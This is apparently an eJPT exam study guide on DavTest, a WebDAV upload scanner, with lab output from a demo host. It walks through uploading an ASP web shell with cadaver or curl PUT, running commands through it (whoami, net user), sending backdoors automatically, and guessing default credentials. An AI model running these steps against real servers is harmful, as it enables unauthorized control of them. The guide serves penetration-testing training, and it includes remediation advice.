---
title: "DavTest - WebDAV Vulnerability Scanner"
topic: "WebDAV Testing"
exam_objective: "Web Application Security Assessment - File Upload Vulnerabilities"
difficulty: "Medium"
tools:
  - "davtest"
  - "cadaver"
  - "curl"
related_labs:
  - "webdav-exploitation"
  - "file-upload-attacks"
file_path: "06-vulnerability-assessment/davtest-webdav-scanner.md"
last_updated: "2025-01-15"
tags:
  - "webdav"
  - "file-upload"
  - "vulnerability-assessment"
  - "web-exploitation"
---

# ğŸ”§ DavTest - WebDAV Vulnerability Scanner

**A simple tool to test WebDAV servers for file upload weaknesses and security issues**

**ğŸ“ File Location:** `06-vulnerability-assessment/davtest-webdav-scanner.md`

---

## ğŸ¯ What is DavTest?

DavTest is a security testing tool that checks **WebDAV servers** for vulnerabilities. WebDAV lets users upload and manage files on web servers. DavTest helps find if you can upload dangerous files like web shells.

### ğŸ” **What DavTest Does:**
- Tests if you can upload files to WebDAV servers
- Checks different file types (.php, .asp, .html, etc.)
- Tests if uploaded files can run on the server
- Checks login requirements and weak passwords
- Creates test folders and cleans up after testing

### ğŸ’¡ **Why This Matters for eJPT:**
Many web servers have WebDAV enabled but with weak security. If you can upload and run script files, you can get a web shell and control the server.

---

## ğŸ“¦ Installation and Setup

### **Already Installed On:**
- âœ… Kali Linux
- âœ… Parrot Security OS
- âœ… Most penetration testing systems

### **Check If Installed:**
```bash
# Check if davtest is available
davtest --help

# Find where it's installed
which davtest
# Output: /usr/bin/davtest
```

### **Install If Missing:**
```bash
# On Debian/Ubuntu
sudo apt update && sudo apt install davtest

# Verify it works
davtest --version
```

---

## ğŸ”§ Basic Usage and Commands

### **ğŸ“‹ Simple Testing Process:**
1. **ğŸ” Find WebDAV:** Look for WebDAV on the target
2. **ğŸ” Test Login:** Try without password, then with credentials
3. **ğŸ“¤ Upload Test:** See what file types you can upload
4. **âš¡ Execute Test:** Check if uploaded files can run
5. **ğŸ“Š Review Results:** Plan your next attack steps

### **âš™ï¸ Basic Command Structure:**
```bash
# Simple format
davtest -url http://target.com/webdav

# With username and password
davtest -auth username:password -url http://target.com/webdav

# With backdoor testing
davtest -sendbd auto -auth user:pass -url http://target.com/webdav
```

---

## âš™ï¸ Command Options You Need to Know

### **ğŸ¯ Essential Commands for eJPT:**

| Command | What It Does | Example | Exam Important |
|---------|--------------|---------|----------------|
| `-url` | Target WebDAV address | `davtest -url http://demo.ine.local/webdav` | â­â­â­â­â­ Critical |
| `-auth` | Username and password | `davtest -auth bob:password123 -url <URL>` | â­â­â­â­â­ Critical |
| `-sendbd` | Upload backdoor files | `davtest -sendbd auto -auth <creds> -url <URL>` | â­â­â­â­ High |
| `-directory` | Custom test folder name | `davtest -directory mytest -url <URL>` | â­â­â­ Medium |

### **ğŸ”§ Extra Options:**

| Command | What It Does | Example | When to Use |
|---------|--------------|---------|-------------|
| `-cleanup` | Delete test files | `davtest -cleanup -url <URL>` | After testing |
| `-quiet` | Less output | `davtest -quiet -url <URL>` | When output is too much |
| `-debug` | Show detailed info | `davtest -debug -url <URL>` | When things don't work |
| `-nocreate` | Don't make new folders | `davtest -nocreate -url <URL>` | When you can't create folders |

### **ğŸ“ File Types Tested:**
DavTest automatically tries these file types:
- **Text:** .txt, .html, .htm
- **Scripts:** .asp, .aspx, .jsp, .php, .pl, .cgi
- **Advanced:** .jhtml, .shtml, .cfm

---

## ğŸ§ª Real Lab Examples with Step-by-Step Results

### **Example 1: First Test Without Password**
```bash
# Command from lab
davtest -url http://demo.ine.local/webdav

# What you see in the terminal
********************************************************
Testing DAV connection
OPEN    FAIL:   http://demo.ine.local/webdav   Unauthorized. Basic realm="demo.ine.local"
********************************************************
```

**ğŸ” What This Means:**
- âŒ **Failed to connect** - needs username and password
- ğŸ” **Uses Basic Auth** - simple login system
- ğŸ·ï¸ **Realm is "demo.ine.local"** - this is the login area name
- â¡ï¸ **Next Step:** Try to find or guess login credentials

---

### **Example 2: Complete Test With Password**
```bash
# Command with login info
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav

# Detailed results from lab
********************************************************
Testing DAV connection
OPEN    SUCCEED:        http://demo.ine.local/webdav
********************************************************
NOTE    Random string for this session: AqOe5dcKMtF
********************************************************
Creating directory
MKCOL   SUCCEED:        Created http://demo.ine.local/webdav/DavTestDir_AqOe5dcKMtF
********************************************************

# TESTING FILE UPLOADS:
Sending test files
PUT     txt     SUCCEED:    http://demo.ine.local/webdav/DavTestDir_AqOe5dcKMtF/davtest_AqOe5dcKMtF.txt
PUT     pl      SUCCEED:    http://demo.ine.local/webdav/DavTestDir_AqOe5dcKMtF/davtest_AqOe5dcKMtF.pl
PUT     html    SUCCEED:    http://demo.ine.local/webdav/DavTestDir_AqOe5dcKMtF/davtest_AqOe5dcKMtF.html
PUT     jsp     SUCCEED:    http://demo.ine.local/webdav/DavTestDir_AqOe5dcKMtF/davtest_AqOe5dcKMtF.jsp
PUT     php     SUCCEED:    http://demo.ine.local/webdav/DavTestDir_AqOe5dcKMtF/davtest_AqOe5dcKMtF.php
PUT     asp     SUCCEED:    http://demo.ine.local/webdav/DavTestDir_AqOe5dcKMtF/davtest_AqOe5dcKMtF.asp
PUT     aspx    SUCCEED:    http://demo.ine.local/webdav/DavTestDir_AqOe5dcKMtF/davtest_AqOe5dcKMtF.aspx

********************************************************
# TESTING IF FILES CAN RUN:
Checking for test file execution
EXEC    txt     SUCCEED:    http://demo.ine.local/webdav/DavTestDir_AqOe5dcKMtF/davtest_AqOe5dcKMtF.txt
EXEC    pl      FAIL        # Perl scripts can't run
EXEC    html    SUCCEED:    http://demo.ine.local/webdav/DavTestDir_AqOe5dcKMtF/davtest_AqOe5dcKMtF.html
EXEC    jsp     FAIL        # Java pages can't run
EXEC    php     FAIL        # PHP scripts can't run
EXEC    asp     SUCCEED:    http://demo.ine.local/webdav/DavTestDir_AqOe5dcKMtF/davtest_AqOe5dcKMtF.asp
EXEC    aspx    FAIL        # ASP.NET can't run

# SUMMARY - THESE FILES CAN RUN:
Executes: http://demo.ine.local/webdav/DavTestDir_AqOe5dcKMtF/davtest_AqOe5dcKMtF.html
Executes: http://demo.ine.local/webdav/DavTestDir_AqOe5dcKMtF/davtest_AqOe5dcKMtF.asp
```

**ğŸ¯ What This Means for eJPT Exam:**

**âœ… ALL FILES CAN BE UPLOADED:**
- This is bad security - the server accepts any file type

**âš¡ DANGEROUS FILES THAT CAN RUN:**
- **`.asp` files** â†’ **CRITICAL DANGER** â†’ You can upload web shells
- **`.html` files** â†’ **MEDIUM DANGER** â†’ You can do XSS attacks

**ğŸš« FILES THAT CAN'T RUN:**
- PHP, JSP, Perl scripts â†’ Server doesn't support these languages

**ğŸ’¡ How to Exploit This:**
1. Upload an ASP web shell using cadaver
2. Visit the shell in browser: `http://demo.ine.local/webdav/shell.asp`
3. Run system commands to take control

---

### **Example 3: Testing With Automatic Backdoors**
```bash
# Advanced command that uploads backdoor files
davtest -sendbd auto -auth bob:password_123321 -directory exploit -url http://demo.ine.local/webdav

# This will:
# 1. Make a folder called 'exploit'
# 2. Upload different backdoor files
# 3. Test which ones can run
# 4. Tell you which backdoors work
```

---

### **Example 4: Clean Professional Testing**
```bash
# Good practice - test and clean up
davtest -auth bob:password_123321 -directory pentest_$(date +%s) -cleanup -url http://demo.ine.local/webdav

# Benefits:
# - Makes unique folder with timestamp
# - Does complete testing
# - Removes all test files automatically
# - Leaves no traces
```

---

## ğŸ¯ eJPT Exam Success Guide

### **ğŸ“Š How Important This Is:**
- **WebDAV Testing:** 30% of web application security tests
- **File Upload Attacks:** 35% of exploitation scenarios
- **Login Testing:** 20% of access control tests
- **Using Tools Properly:** 25% of technical skills

### **ğŸ† Commands You Must Know for eJPT:**

#### **Level 1 - Essential (You WILL see this):**
```bash
# Basic test without password - ALWAYS START HERE
davtest -url http://target/webdav

# Full test with password - CORE SKILL
davtest -auth username:password -url http://target/webdav
```

#### **Level 2 - Important (Good chance you'll see this):**
```bash
# Custom folder to avoid conflicts
davtest -directory custom_test -auth creds -url http://target/webdav

# Upload backdoor files for advanced testing
davtest -sendbd auto -auth creds -url http://target/webdav
```

#### **Level 3 - Advanced (Might appear):**
```bash
# Professional clean testing
davtest -cleanup -auth creds -url http://target/webdav

# Debug when things go wrong
davtest -debug -auth creds -url http://target/webdav
```

### **ğŸ¯ Common eJPT Exam Scenarios:**

#### **Scenario 1: Find WebDAV on Unknown Server**
**Given:** Web server on port 80, you don't know if WebDAV exists
**Your Job:** Find WebDAV and test what it can do

**How to Approach:**
```bash
# Step 1: Scan for services first
nmap -sV -p 80 --script http-enum target_ip

# Step 2: Test common WebDAV locations
davtest -url http://target_ip/webdav
davtest -url http://target_ip/
davtest -url http://target_ip/dav

# Step 3: Write down what you find and test login
```

#### **Scenario 2: Test File Upload Security**
**Given:** WebDAV server with username and password
**Your Job:** Find out what files you can upload and run

**How to Approach:**
```bash
# Complete security test
davtest -auth given_username:given_password -url http://target/webdav

# Document your findings:
# - What files can be uploaded: [list them]
# - What files can run: [list them]
# - How dangerous this is: [HIGH/MEDIUM/LOW]
```

#### **Scenario 3: Upload Web Shell**
**Given:** DavTest shows ASP files can run
**Your Job:** Upload a web shell to control the server

**Step by Step:**
```bash
# 1. Confirm with davtest
davtest -auth creds -url http://target/webdav

# 2. Upload shell using cadaver (different tool)
cadaver http://target/webdav
put /usr/share/webshells/asp/cmd.asp

# 3. Test the shell in browser
# Go to: http://target/webdav/cmd.asp?cmd=whoami
```

### **ğŸ“ eJPT Exam Tips:**

#### **â° Time Management:**
- **2-3 minutes:** Quick test without password
- **5-7 minutes:** Full test with password if you have one
- **1-2 minutes:** Write down results and plan next step

#### **ğŸ¯ Mistakes to Avoid:**
1. **Skipping the no-password test** â†’ Always check if login is needed
2. **Only testing /webdav path** â†’ Try /, /dav, /webdav paths
3. **Ignoring realm information** â†’ Use realm info to guess passwords
4. **Not writing down which files can run** â†’ This is critical for exploitation

#### **âœ… Signs You're Doing Well:**
- You find WebDAV servers quickly
- You determine if passwords are needed
- You correctly list uploadable file types
- You identify which files can execute
- You plan good exploitation steps

### **ğŸ” Typical Exam Questions:**
1. **"What file types can you upload to this WebDAV server?"**
   - Look at the PUT results from davtest

2. **"What login method does the WebDAV server use?"**
   - Look for "Basic realm" or other authentication info

3. **"Which uploaded files can execute on the server?"**
   - Check the EXEC results from davtest

---

## âš ï¸ Common Problems and Solutions

### **âŒ Problem 1: Can't Connect to Server**
**What You See:**
```bash
davtest -url http://target/webdav
# Output: Connection refused / Connection timeout
```

**How to Fix:**
```bash
# 1. Check if target is online
ping target_ip

# 2. Check if web service is running
nmap -p 80 target_ip

# 3. Try different WebDAV paths
davtest -url http://target/
davtest -url http://target/dav
davtest -url http://target/webdav
```

**Solutions:**
- Make sure you have the right IP address and port
- Test different common WebDAV paths
- Check if it uses HTTP or HTTPS

---

### **âŒ Problem 2: Login Not Working**
**What You See:**
```bash
davtest -auth user:pass -url http://target/webdav
# Output: Still getting "401 Unauthorized"
```

**How to Fix:**
```bash
# 1. Test credentials manually with curl
curl -u user:pass http://target/webdav/

# 2. Check for special characters in password
# Some passwords need special formatting

# 3. Try different credential formats
davtest -auth "user:complex!pass@123" -url http://target/webdav
```

**Solutions:**
- Make sure special characters in passwords are handled correctly
- Try different username and password combinations
- Verify the login area matches what you expect

---

### **âŒ Problem 3: Tests Don't Complete**
**What You See:**
```bash
# Tests stop in the middle or show incomplete results
davtest -auth creds -url http://target/webdav
# Output: Some file types missing from results
```

**How to Fix:**
```bash
# Turn on debug mode to see what's happening
davtest -debug -auth creds -url http://target/webdav

# Use unique directory name to avoid conflicts
davtest -directory unique_$(date +%s) -auth creds -url http://target/webdav

# Try quiet mode to reduce output problems
davtest -quiet -auth creds -url http://target/webdav
```

---

### **âŒ Problem 4: Can't Create Folders**
**What You See:**
- Files can be uploaded but folders can't be created
- MKCOL operations fail

**How to Fix:**
```bash
# Skip folder creation and test in main directory
davtest -nocreate -auth creds -url http://target/webdav

# Try with simpler directory names
davtest -directory simple -auth creds -url http://target/webdav
```

---

## ğŸ”— Using DavTest With Other Tools

### **ğŸ¯ Complete Testing Workflow: Nmap â†’ DavTest â†’ Cadaver â†’ Browser**

#### **Step 1: Discovery (Use Nmap)**
```bash
# Find web services and WebDAV
nmap -sV -p 80,8080,443,8443 --script http-enum,http-methods target_ip

# Look for these clues:
# - "WebDAV" mentioned in service info
# - HTTP methods like PUT, PROPFIND, MKCOL
# - Directories like /webdav in results
```

#### **Step 2: Assessment (Use DavTest)**
```bash
# Test the WebDAV paths you found
davtest -url http://target_ip/found_webdav_path

# If password needed, try common ones
davtest -auth admin:admin -url http://target_ip/webdav
davtest -auth guest:guest -url http://target_ip/webdav

# Full test when you have good credentials
davtest -auth working_creds -url http://target_ip/webdav
```

#### **Step 3: Exploitation (Use Cadaver)**
```bash
# If davtest shows ASP files can run, upload a web shell
cadaver http://target_ip/webdav
# Then interactively upload your shell files

# Or use curl for direct upload
curl -X PUT --data-binary @webshell.asp http://username:password@target/webdav/shell.asp
```

#### **Step 4: Control (Use Browser)**
```bash
# Access your uploaded shell
firefox http://target_ip/webdav/shell.asp?cmd=whoami

# Run commands through the web shell
# URL: http://target/webdav/shell.asp?cmd=dir+C:\
# URL: http://target/webdav/shell.asp?cmd=net+user
```

### **ğŸ”§ Using DavTest With Burp Suite**
```bash
# Set up proxy to see all HTTP traffic
export http_proxy=http://127.0.0.1:8080
davtest -auth creds -url http://target/webdav

# Benefits:
# - See exactly what HTTP requests are sent
# - Manually verify how uploads work
# - Test authentication in detail
# - Modify payloads manually
```

### **âš™ï¸ Automation Script Example:**
```bash
#!/bin/bash
# Simple WebDAV testing script

TARGET=$1
echo "[+] Testing WebDAV on $TARGET"

# Test common paths
for path in "" "webdav" "dav" "_vti_bin"; do
    echo "[+] Testing /$path"
    davtest -url http://$TARGET/$path 2>/dev/null | grep -q "SUCCEED" && echo "Found WebDAV at /$path"
done

echo "[+] WebDAV testing complete"
```

---

## ğŸ“Š Understanding DavTest Results

### **ğŸ” Reading the Output:**

#### **Connection Results:**
```bash
OPEN    SUCCEED:    # âœ… WebDAV works and you can connect
OPEN    FAIL:       # âŒ Can't connect or need password
```

#### **File Upload Results:**
```bash
PUT     asp     SUCCEED:    # âœ… ASP files can be uploaded (dangerous)
PUT     php     FAIL:       # âŒ PHP files are blocked (good security)
```

#### **File Execution Results:**
```bash
EXEC    asp     SUCCEED:    # âš¡ ASP files can run (VERY DANGEROUS)
EXEC    html    SUCCEED:    # âš ï¸ HTML files can run (moderate risk)
EXEC    php     FAIL:       # âœ… PHP can't run (safe)
```

### **ğŸ¯ Risk Assessment Guide:**

| File Type | Can Upload? | Can Execute? | Danger Level | What You Can Do |
|-----------|-------------|--------------|--------------|-----------------|
| ASP/ASPX | âœ… | âœ… | ğŸ”´ **CRITICAL** | Upload web shell, control server |
| PHP | âœ… | âœ… | ğŸ”´ **CRITICAL** | Upload web shell, control server |
| JSP | âœ… | âœ… | ğŸ”´ **CRITICAL** | Upload web shell, control server |
| HTML | âœ… | âœ… | ğŸŸ¡ **MEDIUM** | XSS attacks, steal user data |
| TXT | âœ… | âŒ | ğŸŸ¢ **LOW** | Store information only |

### **ğŸ“ˆ What to Do Next:**
1. **Immediate Action:** Any script files that can execute (ASP, PHP, JSP)
2. **Important:** HTML execution for XSS attacks
3. **Document Only:** Files that can upload but not execute

---

## ğŸ“ Writing Professional Reports

### **ğŸ“‹ Quick Summary Template:**
```markdown
## WebDAV Security Test Results

**Target:** [server_address]
**Date:** [test_date]
**Tool:** DavTest
**Tester:** [your_name]

### Summary:
- **Login Required:** [Yes/No]
- **File Types Accepted:** [number] different types
- **Dangerous Files Can Execute:** [Yes/No]
- **Risk Level:** [CRITICAL/HIGH/MEDIUM/LOW]

### Critical Issues Found:
1. **Web Shell Upload Possible** - [which file types] can execute
2. **Weak Login Security** - [credential details]
3. **No File Filtering** - [all file types accepted]

### What to Fix:
1. Block dangerous file uploads (.asp, .php, etc.)
2. Stop uploaded files from executing
3. Strengthen login requirements
4. Regular security testing
```

### **ğŸ”§ Detailed Technical Report:**
```markdown
## Technical WebDAV Assessment Details

### Commands Used:
```bash
# Discovery
davtest -url http://[target]/webdav

# Security testing
davtest -auth [username]:[password] -url http://[target]/webdav

# Results: [copy actual davtest output here]
```

### Upload Test Results:
| File Type | Upload Status | Execute Status | Security Risk |
|-----------|---------------|----------------|---------------|
| .asp | âœ… SUCCESS | âœ… SUCCESS | Web shell possible |
| .html | âœ… SUCCESS | âœ… SUCCESS | XSS attacks possible |
| .txt | âœ… SUCCESS | âŒ BLOCKED | Information storage only |

### Proof of Vulnerability:
[Include screenshots showing web shell upload and execution]

### Evidence Files:
- davtest_results.txt
- webshell_upload_screenshot.png
- command_execution_proof.png
```

---

## ğŸ“ Quick Reference and Study Notes

### **ğŸ§  Memory Card for eJPT:**
```bash
# Print this and keep it handy during the exam
davtest -url http://target/webdav                    # Basic test
davtest -auth user:pass -url http://target/webdav   # With login
davtest -sendbd auto -auth user:pass -url http://target/webdav  # With backdoors
davtest -cleanup -auth user:pass -url http://target/webdav     # Clean test
```

### **ğŸ’¡ Easy Ways to Remember:**
- **DAV**test = **D**angerous **A**ccess **V**ulnerabilities
- **PUT** method = **P**ut **U**p **T**rojan files
- **EXEC** means **EX**ecutable **E**xploit **C**onditions

### **ğŸ¯ eJPT Exam Checklist:**
- [ ] Test WebDAV without password first
- [ ] Try common login credentials
- [ ] Document all uploadable file types
- [ ] Identify executable file types
- [ ] Plan exploitation strategy
- [ ] Clean up test files

---

## ğŸ”— Learning More

### **ğŸ“– Official Resources:**
- **DavTest GitHub:** https://github.com/cldrn/davtest
- **WebDAV Standard:** https://tools.ietf.org/html/rfc4918
- **HTTP Methods:** https://tools.ietf.org/html/rfc7231

### **ğŸ¥ Video Learning:**
- Search for "WebDAV exploitation with DavTest"
- "eJPT web application testing tutorials"
- "File upload vulnerability demonstrations"

### **ğŸ“š Books to Read:**
- "The Web Application Hacker's Handbook" - File upload attacks chapter
- "Penetration Testing: A Hands-On Introduction" - WebDAV sections
- OWASP Testing Guide - File upload testing methods

### **ğŸƒâ€â™‚ï¸ Practice Labs:**
- **HackTheBox:** Look for machines with WebDAV services
- **TryHackMe:** Web application penetration testing rooms
- **VulnHub:** Download VMs with file upload challenges
- **PortSwigger Academy:** File upload vulnerability labs

### **ğŸ”§ Related Tools to Learn:**
- **Cadaver:** Manual WebDAV file operations
- **Curl:** Custom HTTP requests to WebDAV
- **Nmap:** Scripts to find WebDAV services
- **Burp Suite:** Advanced request manipulation
- **Nikto:** Web vulnerability scanning

---

## ğŸ†˜ Quick Help

### **When DavTest Doesn't Work:**
1. **Check connection:** `ping target_ip`
2. **Verify WebDAV exists:** `nmap --script http-methods target`
3. **Test manually:** `curl -X OPTIONS http://target/webdav`
4. **Get more info:** `davtest -debug -url http://target/webdav`

### **Getting Help:**
- **Reddit communities:** r/NetSecStudents, r/cybersecurity
- **Discord servers:** Penetration testing study groups
- **Forums:** Security-focused discussion boards
- **Study groups:** Join eJPT preparation communities

---

## ğŸ“ Final Notes for eJPT Success

Remember: DavTest is a simple but powerful tool. In the eJPT exam:
- Always test for WebDAV on web servers
- Document what file types can be uploaded
- Pay special attention to files that can execute
- Plan your next steps based on the results
- Practice with the tool until you can use it quickly and confidently

Good luck with your eJPT preparation! ğŸš€
